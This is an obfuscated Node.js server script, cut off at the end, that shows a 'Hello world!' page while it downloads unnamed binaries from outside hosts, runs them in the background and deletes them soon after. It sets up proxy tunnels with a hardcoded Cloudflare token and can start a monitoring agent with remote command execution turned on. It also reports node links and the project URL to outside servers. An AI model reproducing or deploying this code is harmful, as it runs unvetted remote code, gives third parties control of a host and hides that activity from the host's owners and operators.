const _0x360ae3=_0x47ef;(function(_0x2a0ae5,_0x1d30b7){const _0x11fdf2=_0x47ef,_0xb64bec=_0x2a0ae5();while(!![]){try{const _0x29892f=-parseInt(_0x11fdf2(0xc4))/0x1+parseInt(_0x11fdf2(0x169))/0x2+-parseInt(_0x11fdf2(0x165))/0x3*(parseInt(_0x11fdf2(0x126))/0x4)+-parseInt(_0x11fdf2(0x125))/0x5+-parseInt(_0x11fdf2(0xe0))/0x6+parseInt(_0x11fdf2(0x12c))/0x7+parseInt(_0x11fdf2(0x13a))/0x8;if(_0x29892f===_0x1d30b7)break;else _0xb64bec['push'](_0xb64bec['shift']());}catch(_0x2b6fbf){_0xb64bec['push'](_0xb64bec['shift']());}}}(_0x2126,0x3414b));const express=require(_0x360ae3(0xe7)),app=express(),axios=require(_0x360ae3(0xe3)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x360ae3(0x10a)),exec=promisify(require(_0x360ae3(0xcd))[_0x360ae3(0x111)]),{execSync}=require(_0x360ae3(0xcd)),UPLOAD_URL=process[_0x360ae3(0x122)][_0x360ae3(0xc9)]||'',PROJECT_URL=process['env'][_0x360ae3(0xdc)]||'',AUTO_ACCESS=process[_0x360ae3(0x122)][_0x360ae3(0x138)]||![],FILE_PATH=process[_0x360ae3(0x122)][_0x360ae3(0xc0)]||_0x360ae3(0xce),SUB_PATH=process[_0x360ae3(0x122)][_0x360ae3(0x14c)]||_0x360ae3(0x134),PORT=process[_0x360ae3(0x122)][_0x360ae3(0x170)]||process['env'][_0x360ae3(0x14b)]||0xbb8,UUID=process[_0x360ae3(0x122)][_0x360ae3(0x100)]||_0x360ae3(0x171),NEZHA_SERVER=process[_0x360ae3(0x122)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x360ae3(0x122)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x360ae3(0x122)][_0x360ae3(0xf8)]||'',ARGO_DOMAIN=process[_0x360ae3(0x122)][_0x360ae3(0x168)]||_0x360ae3(0xd4),ARGO_AUTH=process[_0x360ae3(0x122)]['ARGO_AUTH']||_0x360ae3(0x16c),ARGO_PORT=process[_0x360ae3(0x122)]['ARGO_PORT']||0x1f41,CFIP=process['env'][_0x360ae3(0x149)]||'cdns.doon.eu.org',CFPORT=process[_0x360ae3(0x122)]['CFPORT']||0x1bb,NAME=process[_0x360ae3(0x122)][_0x360ae3(0x175)]||'';!fs['existsSync'](FILE_PATH)?(fs[_0x360ae3(0x143)](FILE_PATH),console[_0x360ae3(0x14e)](FILE_PATH+_0x360ae3(0xc5))):console[_0x360ae3(0x14e)](FILE_PATH+_0x360ae3(0x141));function generateRandomName(){const _0x42996d=_0x360ae3,_0x13d60e=_0x42996d(0x13e);let _0x5d7d01='';for(let _0x4d3249=0x0;_0x4d3249<0x6;_0x4d3249++){_0x5d7d01+=_0x13d60e['charAt'](Math['floor'](Math[_0x42996d(0xe4)]()*_0x13d60e[_0x42996d(0x108)]));}return _0x5d7d01;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x360ae3(0xba)](FILE_PATH,phpName),webPath=path[_0x360ae3(0xba)](FILE_PATH,webName),botPath=path[_0x360ae3(0xba)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x360ae3(0x11a)),listPath=path[_0x360ae3(0xba)](FILE_PATH,_0x360ae3(0x162)),bootLogPath=path[_0x360ae3(0xba)](FILE_PATH,_0x360ae3(0xb5)),configPath=path[_0x360ae3(0xba)](FILE_PATH,_0x360ae3(0x15b));function deleteNodes(){const _0x3884fe=_0x360ae3;try{if(!UPLOAD_URL)return;if(!fs[_0x3884fe(0x120)](subPath))return;let _0x3117d3;try{_0x3117d3=fs[_0x3884fe(0x16a)](subPath,'utf-8');}catch{return null;}const _0x30dc7e=Buffer[_0x3884fe(0xbe)](_0x3117d3,_0x3884fe(0x12e))[_0x3884fe(0x136)](_0x3884fe(0x101)),_0x43bb30=_0x30dc7e[_0x3884fe(0xd1)]('\x0a')[_0x3884fe(0x13d)](_0x3a89e8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3a89e8));if(_0x43bb30[_0x3884fe(0x108)]===0x0)return;return axios[_0x3884fe(0x16e)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x3884fe(0x133)]({'nodes':_0x43bb30}),{'headers':{'Content-Type':_0x3884fe(0x142)}})[_0x3884fe(0x106)](_0x55ecb7=>{return null;}),null;}catch(_0x1db8d1){return null;}}function cleanupOldFiles(){const _0x3dd47c=_0x360ae3;try{const _0x579991=fs[_0x3dd47c(0x13f)](FILE_PATH);_0x579991[_0x3dd47c(0x132)](_0x80f23b=>{const _0x405cf8=_0x3dd47c,_0x4acabb=path[_0x405cf8(0xba)](FILE_PATH,_0x80f23b);try{const _0x2842d2=fs[_0x405cf8(0x114)](_0x4acabb);_0x2842d2['isFile']()&&fs['unlinkSync'](_0x4acabb);}catch(_0xd708cb){}});}catch(_0x397423){}}function _0x47ef(_0x1da831,_0x4693ee){const _0x2126d2=_0x2126();return _0x47ef=function(_0x47eff5,_0x46ad9d){_0x47eff5=_0x47eff5-0xb5;let _0x2ded11=_0x2126d2[_0x47eff5];return _0x2ded11;},_0x47ef(_0x1da831,_0x4693ee);}app[_0x360ae3(0xf6)]('/',function(_0x264726,_0x1798f2){const _0x318d2c=_0x360ae3;_0x1798f2['send'](_0x318d2c(0xf1));});async function generateConfig(){const _0x32e6fc=_0x360ae3,_0x41270b={'log':{'access':'/dev/null','error':_0x32e6fc(0x127),'loglevel':_0x32e6fc(0xf9)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x32e6fc(0xeb),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x32e6fc(0x148),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x32e6fc(0x105)}},{'port':0xbb9,'listen':_0x32e6fc(0xf7),'protocol':_0x32e6fc(0xeb),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x32e6fc(0x105),'security':_0x32e6fc(0xf9)}},{'port':0xbba,'listen':_0x32e6fc(0xf7),'protocol':_0x32e6fc(0xeb),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x32e6fc(0x152)}},'sniffing':{'enabled':!![],'destOverride':[_0x32e6fc(0x107),_0x32e6fc(0x14f),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x32e6fc(0xf7),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x32e6fc(0x148)}},'sniffing':{'enabled':!![],'destOverride':[_0x32e6fc(0x107),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x32e6fc(0xf0),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x32e6fc(0x107),_0x32e6fc(0x14f),_0x32e6fc(0xca)],'metadataOnly':![]}}],'dns':{'servers':[_0x32e6fc(0x172)]},'outbounds':[{'protocol':_0x32e6fc(0x119),'tag':'direct'},{'protocol':_0x32e6fc(0x116),'tag':_0x32e6fc(0xbb)}]};fs['writeFileSync'](path[_0x32e6fc(0xba)](FILE_PATH,_0x32e6fc(0x15b)),JSON['stringify'](_0x41270b,null,0x2));}function getSystemArchitecture(){const _0xec1c47=_0x360ae3,_0x2fe426=os[_0xec1c47(0xf2)]();return _0x2fe426===_0xec1c47(0xd8)||_0x2fe426==='arm64'||_0x2fe426===_0xec1c47(0xe1)?_0xec1c47(0xd8):_0xec1c47(0x15f);}function downloadFile(_0x58995d,_0x3eda29,_0x32e23e){const _0x4ed903=_0x360ae3,_0x187e78=_0x58995d;!fs[_0x4ed903(0x120)](FILE_PATH)&&fs[_0x4ed903(0x143)](FILE_PATH,{'recursive':!![]});const _0x23c373=fs[_0x4ed903(0x154)](_0x187e78);axios({'method':_0x4ed903(0xf6),'url':_0x3eda29,'responseType':_0x4ed903(0x131)})[_0x4ed903(0x139)](_0xeaa380=>{const _0x3ab89d=_0x4ed903;_0xeaa380[_0x3ab89d(0x159)]['pipe'](_0x23c373),_0x23c373['on'](_0x3ab89d(0xd5),()=>{const _0x11710d=_0x3ab89d;_0x23c373[_0x11710d(0x10c)](),console[_0x11710d(0x14e)](_0x11710d(0xfd)+path[_0x11710d(0x153)](_0x187e78)+_0x11710d(0x11b)),_0x32e23e(null,_0x187e78);}),_0x23c373['on'](_0x3ab89d(0xfb),_0x2d39b6=>{const _0x1df6c8=_0x3ab89d;fs[_0x1df6c8(0x12f)](_0x187e78,()=>{});const _0x4d8eba=_0x1df6c8(0xfd)+path[_0x1df6c8(0x153)](_0x187e78)+_0x1df6c8(0x130)+_0x2d39b6['message'];console['error'](_0x4d8eba),_0x32e23e(_0x4d8eba);});})[_0x4ed903(0x106)](_0x2746dc=>{const _0x43b440=_0x4ed903,_0x388e98='Download\x20'+path[_0x43b440(0x153)](_0x187e78)+_0x43b440(0x130)+_0x2746dc[_0x43b440(0x16d)];console[_0x43b440(0xfb)](_0x388e98),_0x32e23e(_0x388e98);});}async function downloadFilesAndRun(){const _0x47070b=_0x360ae3,_0x1ff0af=getSystemArchitecture(),_0x5864a5=getFilesForArchitecture(_0x1ff0af);if(_0x5864a5[_0x47070b(0x108)]===0x0){console[_0x47070b(0x14e)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x2f7bab=_0x5864a5[_0x47070b(0x10d)](_0xbd0738=>{return new Promise((_0x3a9ab5,_0x4e0008)=>{const _0x4bf0e3=_0x47ef;downloadFile(_0xbd0738[_0x4bf0e3(0xf4)],_0xbd0738[_0x4bf0e3(0x13b)],(_0x40cb06,_0x202f24)=>{_0x40cb06?_0x4e0008(_0x40cb06):_0x3a9ab5(_0x202f24);});});});try{await Promise['all'](_0x2f7bab);}catch(_0x5077e0){console[_0x47070b(0xfb)](_0x47070b(0x164),_0x5077e0);return;}function _0x38cd2a(_0x44e617){const _0x4b7c46=_0x47070b,_0x365a12=0x1fd;_0x44e617[_0x4b7c46(0x132)](_0xea2f7a=>{const _0x474d1d=_0x4b7c46;fs[_0x474d1d(0x120)](_0xea2f7a)&&fs[_0x474d1d(0xef)](_0xea2f7a,_0x365a12,_0x29e2a1=>{const _0x9963db=_0x474d1d;_0x29e2a1?console[_0x9963db(0xfb)](_0x9963db(0x150)+_0xea2f7a+':\x20'+_0x29e2a1):console[_0x9963db(0x14e)](_0x9963db(0x10e)+_0xea2f7a+':\x20'+_0x365a12[_0x9963db(0x136)](0x8));});});}const _0x5f589e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x38cd2a(_0x5f589e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x11426f=NEZHA_SERVER[_0x47070b(0x117)](':')?NEZHA_SERVER[_0x47070b(0xd1)](':')[_0x47070b(0x155)]():'',_0x574582=new Set([_0x47070b(0xea),_0x47070b(0xbc),_0x47070b(0x156),_0x47070b(0x137),'2083',_0x47070b(0xcb)]),_0x412261=_0x574582[_0x47070b(0x160)](_0x11426f)?_0x47070b(0xee):_0x47070b(0xc6),_0x5cc778=_0x47070b(0xd3)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x47070b(0x10b)+_0x412261+_0x47070b(0x15c)+UUID;fs[_0x47070b(0x110)](path[_0x47070b(0xba)](FILE_PATH,_0x47070b(0x121)),_0x5cc778);const _0xfec4e8=_0x47070b(0x157)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x47070b(0x128);try{await exec(_0xfec4e8),console[_0x47070b(0x14e)](phpName+'\x20is\x20running'),await new Promise(_0x303458=>setTimeout(_0x303458,0x3e8));}catch(_0x534838){console[_0x47070b(0xfb)]('php\x20running\x20error:\x20'+_0x534838);}}else{let _0x361f4c='';const _0x58c013=['443','8443',_0x47070b(0x156),'2087','2083',_0x47070b(0xcb)];_0x58c013[_0x47070b(0x117)](NEZHA_PORT)&&(_0x361f4c=_0x47070b(0xfc));const _0x5ec285=_0x47070b(0x157)+npmPath+_0x47070b(0x15e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x47070b(0xd7)+NEZHA_KEY+'\x20'+_0x361f4c+_0x47070b(0xfe);try{await exec(_0x5ec285),console[_0x47070b(0x14e)](npmName+_0x47070b(0x163)),await new Promise(_0xbdc3c6=>setTimeout(_0xbdc3c6,0x3e8));}catch(_0xc2da6f){console['error'](_0x47070b(0x140)+_0xc2da6f);}}}else console[_0x47070b(0x14e)](_0x47070b(0x129));const _0xa80a4b='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0xa80a4b),console[_0x47070b(0x14e)](webName+_0x47070b(0x163)),await new Promise(_0x13f38d=>setTimeout(_0x13f38d,0x3e8));}catch(_0x527f57){console[_0x47070b(0xfb)]('web\x20running\x20error:\x20'+_0x527f57);}if(fs[_0x47070b(0x120)](botPath)){let _0x9d601f;if(ARGO_AUTH[_0x47070b(0xb7)](/^[A-Z0-9a-z=]{120,250}$/))_0x9d601f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x47070b(0xb7)](/TunnelSecret/)?_0x9d601f=_0x47070b(0x11f)+FILE_PATH+'/tunnel.yml\x20run':_0x9d601f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x47070b(0x161)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x9d601f+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x47070b(0x163)),await new Promise(_0x2c1114=>setTimeout(_0x2c1114,0x7d0));}catch(_0x1eb856){console[_0x47070b(0xfb)](_0x47070b(0x166)+_0x1eb856);}}await new Promise(_0x576072=>setTimeout(_0x576072,0x1388));}function _0x2126(){const _0x13df07=['existsSync','config.yaml','env','country_code','charAt','1715935IJQYUk','40112yOdyYE','/dev/null','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','NEZHA\x20variable\x20is\x20empty,skip\x20running','success','text/plain;\x20charset=utf-8','1612324nbOOlQ','win32','base64','unlink','\x20failed:\x20','stream','forEach','stringify','sub','Skipping\x20adding\x20automatic\x20access\x20task','toString','2087','AUTO_ACCESS','then','6341312pGzuOq','fileUrl','https://ipapi.co/json/','filter','abcdefghijklmnopqrstuvwxyz','readdirSync','npm\x20running\x20error:\x20','\x20already\x20exists','application/json','mkdirSync','https://arm64.ssss.nyc.mn/v1','/vmess-argo?ed=2560','tunnel.json','\x20>\x20nul\x202>&1','/vmess-argo','CFIP','Error\x20in\x20startserver:','PORT','SUB_PATH','&path=%2Fvless-argo%3Fed%3D2560#','log','tls','Empowerment\x20failed\x20for\x20','/api/add-subscriptions','/vless-argo','basename','createWriteStream','pop','2096','nohup\x20','.exe\x20>\x20nul\x202>&1','data','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','config.json','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','ArgoDomain:','\x20-s\x20','amd','has','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','list.txt','\x20is\x20running','Error\x20downloading\x20files:','84lruOEQ','Error\x20executing\x20command:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','ARGO_DOMAIN','207742iaYKti','readFileSync','App\x20is\x20running','eyJhIjoiMGRlNTk5Nzg2YWJmNzNkMDdiN2QxYWY0ZmEyYTNjMTMiLCJ0IjoiY2U3MjdhMDctMWE1MS00MjQxLWIyNzMtNDdmMTViMzk2YmUwIiwicyI6Ik1EVmxOV1pqWVRBdE5UVTFOeTAwWVRCakxUbGtNREl0T0dVMU5qWmpZekUyT1dSaCJ9','message','post','rm\x20-rf\x20','SERVER_PORT','1a34b511-755d-4fa9-9613-e17529dcecc7','https+local://8.8.8.8/dns-query','?encryption=none&security=tls&sni=','Subscription\x20uploaded\x20successfully','NAME','boot.log','tunnel.yml','match','&fp=firefox&type=ws&host=','/api/add-nodes','join','block','8443','http://ip-api.com/json/','from','push','FILE_PATH','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Unknown','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','68089hRbMhd','\x20is\x20created','false','send','set','UPLOAD_URL','quic','2053','Content-Type','child_process','./tmp','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','countryCode','split','firefox','\x0aclient_secret:\x20','sz02.mln2022.gq','finish','org','\x20-p\x20','arm','unshift','automatic\x20access\x20task\x20added\x20successfully','status','PROJECT_URL','https://oooo.serv00.net/add-url','\x0a\x20\x20credentials-file:\x20','platform','1328904vRCQuV','aarch64','Error\x20reading\x20boot.log:','axios','random','\x20>/dev/null\x202>&1','ARGO_DOMAIN:','express','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','del\x20/f\x20/q\x20','443','vless','response','&path=%2Ftrojan-argo%3Fed%3D2560#','true','chmod','trojan','Hello\x20world!','arch','substring','fileName','Unhandled\x20error\x20in\x20startserver:','get','127.0.0.1','NEZHA_KEY','none','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','error','--tls','Download\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','taskkill\x20/f\x20/im\x20','UUID','utf-8','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https://arm64.ssss.nyc.mn/bot','https://arm64.ssss.nyc.mn/web','tcp','catch','http','length','clear','util','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','close','map','Empowerment\x20success\x20for\x20','Nodes\x20uploaded\x20successfully','writeFileSync','exec','\x0a\x0atrojan://','\x0a\x0avmess://','statSync','?security=tls&sni=','blackhole','includes','http\x20server\x20is\x20running\x20on\x20port:','freedom','sub.txt','\x20successfully','\x0a\x20\x20tunnel:\x20','https://amd64.ssss.nyc.mn/web','\x22\x20>\x20/dev/null\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--config\x20'];_0x2126=function(){return _0x13df07;};return _0x2126();}function getFilesForArchitecture(_0x2482df){const _0x41ac6e=_0x360ae3;let _0xb6fc07;_0x2482df===_0x41ac6e(0xd8)?_0xb6fc07=[{'fileName':webPath,'fileUrl':_0x41ac6e(0x104)},{'fileName':botPath,'fileUrl':_0x41ac6e(0x103)}]:_0xb6fc07=[{'fileName':webPath,'fileUrl':_0x41ac6e(0x11d)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x418a4e=_0x2482df===_0x41ac6e(0xd8)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0xb6fc07[_0x41ac6e(0xd9)]({'fileName':npmPath,'fileUrl':_0x418a4e});}else{const _0x445035=_0x2482df===_0x41ac6e(0xd8)?_0x41ac6e(0x144):'https://amd64.ssss.nyc.mn/v1';_0xb6fc07[_0x41ac6e(0xd9)]({'fileName':phpPath,'fileUrl':_0x445035});}}return _0xb6fc07;}function argoType(){const _0xb29f90=_0x360ae3;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xb29f90(0x14e)](_0xb29f90(0xc3));return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs[_0xb29f90(0x110)](path[_0xb29f90(0xba)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x30cc77=_0xb29f90(0x11c)+ARGO_AUTH[_0xb29f90(0xd1)]('\x22')[0xb]+_0xb29f90(0xde)+path[_0xb29f90(0xba)](FILE_PATH,_0xb29f90(0x146))+_0xb29f90(0xfa)+ARGO_DOMAIN+_0xb29f90(0x15a)+ARGO_PORT+_0xb29f90(0xc1);fs[_0xb29f90(0x110)](path['join'](FILE_PATH,_0xb29f90(0xb6)),_0x30cc77);}else console['log'](_0xb29f90(0xcf));}async function extractDomains(){const _0x2c8da1=_0x360ae3;let _0x20b50b;if(ARGO_AUTH&&ARGO_DOMAIN)_0x20b50b=ARGO_DOMAIN,console['log'](_0x2c8da1(0xe6),_0x20b50b),await _0x58768b(_0x20b50b);else try{const _0x315e18=fs[_0x2c8da1(0x16a)](path[_0x2c8da1(0xba)](FILE_PATH,_0x2c8da1(0xb5)),_0x2c8da1(0x101)),_0x2ca84a=_0x315e18[_0x2c8da1(0xd1)]('\x0a'),_0x59eb4b=[];_0x2ca84a[_0x2c8da1(0x132)](_0x1e55da=>{const _0x4cad2a=_0x2c8da1,_0x5ef2ba=_0x1e55da[_0x4cad2a(0xb7)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5ef2ba){const _0x27f0aa=_0x5ef2ba[0x1];_0x59eb4b[_0x4cad2a(0xbf)](_0x27f0aa);}});if(_0x59eb4b[_0x2c8da1(0x108)]>0x0)_0x20b50b=_0x59eb4b[0x0],console[_0x2c8da1(0x14e)](_0x2c8da1(0x15d),_0x20b50b),await _0x58768b(_0x20b50b);else{console[_0x2c8da1(0x14e)](_0x2c8da1(0xe8)),fs['unlinkSync'](path[_0x2c8da1(0xba)](FILE_PATH,_0x2c8da1(0xb5)));async function _0x194c8b(){const _0x315823=_0x2c8da1;try{process[_0x315823(0xdf)]===_0x315823(0x12d)?await exec(_0x315823(0xff)+botName+_0x315823(0x158)):await exec('pkill\x20-f\x20\x22['+botName[_0x315823(0x124)](0x0)+']'+botName[_0x315823(0xf3)](0x1)+_0x315823(0x11e));}catch(_0x499733){}}_0x194c8b(),await new Promise(_0x14e12b=>setTimeout(_0x14e12b,0xbb8));const _0x3c9771=_0x2c8da1(0x167)+FILE_PATH+_0x2c8da1(0x161)+ARGO_PORT;try{await exec(_0x2c8da1(0x157)+botPath+'\x20'+_0x3c9771+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x2c8da1(0x163)),await new Promise(_0x502e2c=>setTimeout(_0x502e2c,0xbb8)),await extractDomains();}catch(_0x358af3){console[_0x2c8da1(0xfb)](_0x2c8da1(0x166)+_0x358af3);}}}catch(_0x371778){console[_0x2c8da1(0xfb)](_0x2c8da1(0xe2),_0x371778);}async function _0x1a0e19(){const _0x455f3f=_0x2c8da1;try{const _0x3d34f5=await axios['get'](_0x455f3f(0x13c),{'timeout':0xbb8});if(_0x3d34f5[_0x455f3f(0x159)]&&_0x3d34f5[_0x455f3f(0x159)][_0x455f3f(0x123)]&&_0x3d34f5['data']['org'])return _0x3d34f5[_0x455f3f(0x159)][_0x455f3f(0x123)]+'_'+_0x3d34f5['data']['org'];}catch(_0x4a59d1){try{const _0x30c4d7=await axios[_0x455f3f(0xf6)](_0x455f3f(0xbd),{'timeout':0xbb8});if(_0x30c4d7[_0x455f3f(0x159)]&&_0x30c4d7['data'][_0x455f3f(0xdb)]===_0x455f3f(0x12a)&&_0x30c4d7[_0x455f3f(0x159)][_0x455f3f(0xd0)]&&_0x30c4d7['data'][_0x455f3f(0xd6)])return _0x30c4d7[_0x455f3f(0x159)]['countryCode']+'_'+_0x30c4d7[_0x455f3f(0x159)][_0x455f3f(0xd6)];}catch(_0x2544b6){}}return _0x455f3f(0xc2);}async function _0x58768b(_0x42253d){const _0x5e655f=await _0x1a0e19(),_0x29099f=NAME?NAME+'-'+_0x5e655f:_0x5e655f;return new Promise(_0x10fecd=>{setTimeout(()=>{const _0x4f68ec=_0x47ef,_0x1e604e={'v':'2','ps':''+_0x29099f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4f68ec(0xf9),'net':'ws','type':_0x4f68ec(0xf9),'host':_0x42253d,'path':_0x4f68ec(0x145),'tls':_0x4f68ec(0x14f),'sni':_0x42253d,'alpn':'','fp':_0x4f68ec(0xd2)},_0x313bb9='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x4f68ec(0x173)+_0x42253d+_0x4f68ec(0xb8)+_0x42253d+_0x4f68ec(0x14d)+_0x29099f+_0x4f68ec(0x113)+Buffer[_0x4f68ec(0xbe)](JSON[_0x4f68ec(0x133)](_0x1e604e))['toString']('base64')+_0x4f68ec(0x112)+UUID+'@'+CFIP+':'+CFPORT+_0x4f68ec(0x115)+_0x42253d+'&fp=firefox&type=ws&host='+_0x42253d+_0x4f68ec(0xed)+_0x29099f+'\x0a\x20\x20\x20\x20';console[_0x4f68ec(0x14e)](Buffer[_0x4f68ec(0xbe)](_0x313bb9)[_0x4f68ec(0x136)](_0x4f68ec(0x12e))),fs[_0x4f68ec(0x110)](subPath,Buffer[_0x4f68ec(0xbe)](_0x313bb9)[_0x4f68ec(0x136)](_0x4f68ec(0x12e))),console[_0x4f68ec(0x14e)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x4f68ec(0xf6)]('/'+SUB_PATH,(_0x1effe6,_0x1771d3)=>{const _0x1fa444=_0x4f68ec,_0x4af1e1=Buffer[_0x1fa444(0xbe)](_0x313bb9)[_0x1fa444(0x136)](_0x1fa444(0x12e));_0x1771d3[_0x1fa444(0xc8)](_0x1fa444(0xcc),_0x1fa444(0x12b)),_0x1771d3[_0x1fa444(0xc7)](_0x4af1e1);}),_0x10fecd(_0x313bb9);},0x7d0);});}}async function uploadNodes(){const _0x41a300=_0x360ae3;if(UPLOAD_URL&&PROJECT_URL){const _0x36624c=PROJECT_URL+'/'+SUB_PATH,_0x502ee9={'subscription':[_0x36624c]};try{const _0x12c0a0=await axios[_0x41a300(0x16e)](UPLOAD_URL+_0x41a300(0x151),_0x502ee9,{'headers':{'Content-Type':_0x41a300(0x142)}});return _0x12c0a0&&_0x12c0a0[_0x41a300(0xdb)]===0xc8?(console['log'](_0x41a300(0x174)),_0x12c0a0):null;}catch(_0x497d15){if(_0x497d15[_0x41a300(0xec)]){if(_0x497d15[_0x41a300(0xec)][_0x41a300(0xdb)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x4b2bfe=fs[_0x41a300(0x16a)](listPath,_0x41a300(0x101)),_0x1c298a=_0x4b2bfe[_0x41a300(0xd1)]('\x0a')[_0x41a300(0x13d)](_0x1a7cb4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1a7cb4));if(_0x1c298a[_0x41a300(0x108)]===0x0)return;const _0x4964cb=JSON[_0x41a300(0x133)]({'nodes':_0x1c298a});try{const _0x1202c7=await axios[_0x41a300(0x16e)](UPLOAD_URL+_0x41a300(0xb9),_0x4964cb,{'headers':{'Content-Type':'application/json'}});return _0x1202c7&&_0x1202c7[_0x41a300(0xdb)]===0xc8?(console['log'](_0x41a300(0x10f)),_0x1202c7):null;}catch(_0x1b7ea7){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5b6353=_0x47ef,_0x5c9757=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5c9757[_0x5b6353(0xbf)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5c9757['push'](phpPath);process['platform']===_0x5b6353(0x12d)?exec(_0x5b6353(0xe9)+_0x5c9757[_0x5b6353(0xba)]('\x20')+_0x5b6353(0x147),_0x54d587=>{const _0x21d018=_0x5b6353;console[_0x21d018(0x109)](),console[_0x21d018(0x14e)](_0x21d018(0x16b)),console[_0x21d018(0x14e)](_0x21d018(0x102));}):exec(_0x5b6353(0x16f)+_0x5c9757[_0x5b6353(0xba)]('\x20')+_0x5b6353(0xe5),_0x2594ea=>{const _0x5e78cd=_0x5b6353;console[_0x5e78cd(0x109)](),console['log']('App\x20is\x20running'),console[_0x5e78cd(0x14e)](_0x5e78cd(0x102));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x11ca9d=_0x360ae3;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x11ca9d(0x135));return;}try{const _0x451f90=await axios[_0x11ca9d(0x16e)](_0x11ca9d(0xdd),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x11ca9d(0x142)}});return console[_0x11ca9d(0x14e)](_0x11ca9d(0xda)),_0x451f90;}catch(_0x167e56){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x167e56[_0x11ca9d(0x16d)]),null;}}async function startserver(){const _0x2f1bc1=_0x360ae3;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3de84a){console['error'](_0x2f1bc1(0x14a),_0x3de84a);}}startserver()[_0x360ae3(0x106)](_0x3e4e59=>{const 